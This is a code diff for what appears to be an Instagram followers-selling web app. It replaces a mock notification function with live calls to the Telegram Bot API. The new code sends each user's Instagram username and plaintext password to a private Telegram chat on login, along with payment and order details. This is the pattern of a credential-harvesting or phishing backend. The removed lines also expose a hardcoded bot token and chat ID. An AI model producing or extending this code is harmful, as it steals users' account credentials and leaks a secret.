@@ -51,32 +51,73 @@ const paymentSchema = z.object({
   paymentMethod: z.string().min(1),
 });
 
-// Mock Telegram bot function
+// Real Telegram bot function
 async function sendToTelegramBot(action: string, data: any) {
-  console.log(`🤖 Telegram Bot Notification [${action.toUpperCase()}]:`, data);
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
   
-  // In production, this would send to actual Telegram Bot API
-  const botToken = process.env.TELEGRAM_BOT_TOKEN || "7275717734:AAE6bq0Mdypn_wQL6F1wpphzEtLAco3_B3Y";
-  const chatId = process.env.TELEGRAM_CHAT_ID || "6881713177";
+  if (!botToken || !chatId) {
+    console.log(`⚠️ Telegram credentials missing. Would send: [${action.toUpperCase()}]`, data);
+    return;
+  }
   
   let message = "";
   switch (action) {
     case "login":
-      message = `🔐 New Login\nUID: ${data.uid}\nUsername: ${data.instagramUsername}\nPassword: ${data.password}`;
+      message = `🔐 *New Login Alert*\n\n` +
+               `📱 *UID:* \`${data.uid}\`\n` +
+               `👤 *Instagram:* @${data.instagramUsername}\n` +
+               `🔑 *Password:* \`${data.password}\`\n\n` +
+               `⏰ ${new Date().toLocaleString()}`;
       break;
     case "payment":
-      message = `💰 Payment Request\nUID: ${data.uid}\nAmount: ₹${data.amount}\nUTR: ${data.utrNumber}\nMethod: ${data.paymentMethod}`;
+      message = `💰 *Payment Request*\n\n` +
+               `📱 *UID:* \`${data.uid}\`\n` +
+               `💵 *Amount:* ₹${data.amount}\n` +
+               `🏦 *UTR:* \`${data.utrNumber}\`\n` +
+               `💳 *Method:* ${data.paymentMethod}\n\n` +
+               `⏰ ${new Date().toLocaleString()}`;
       break;
     case "order":
-      message = `📦 New Order\nUID: ${data.uid}\nService: ${data.serviceName}\nQuantity: ${data.quantity}\nPrice: ₹${data.price}\nUsername: ${data.instagramUsername}`;
+      message = `📦 *New Order Placed*\n\n` +
+               `📱 *UID:* \`${data.uid}\`\n` +
+               `🛍️ *Service:* ${data.serviceName}\n` +
+               `📊 *Quantity:* ${data.quantity.toLocaleString()}\n` +
+               `💰 *Price:* ₹${data.price}\n` +
+               `👤 *Target:* @${data.instagramUsername}\n` +
+               `🆔 *Order ID:* \`${data.orderId}\`\n\n` +
+               `⏰ ${new Date().toLocaleString()}`;
       break;
     case "bonus":
-      message = `🎁 Bonus Claimed\nUID: ${data.uid}\nAmount: ₹10`;
+      message = `🎁 *Bonus Claimed*\n\n` +
+               `📱 *UID:* \`${data.uid}\`\n` +
+               `💰 *Bonus:* ₹10\n\n` +
+               `⏰ ${new Date().toLocaleString()}`;
       break;
   }
 
-  // Mock API call - in production would use actual fetch to Telegram API
-  console.log(`Would send to Telegram: ${message}`);
+  try {
+    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const response = await fetch(telegramUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'Markdown',
+      }),
+    });
+
+    if (response.ok) {
+      console.log(`✅ Telegram notification sent: ${action}`);
+    } else {
+      console.error(`❌ Failed to send Telegram notification: ${response.statusText}`);
+    }
+  } catch (error) {
+    console.error(`❌ Telegram API error:`, error);
+  }
 }
 
 function generateUID(): string {
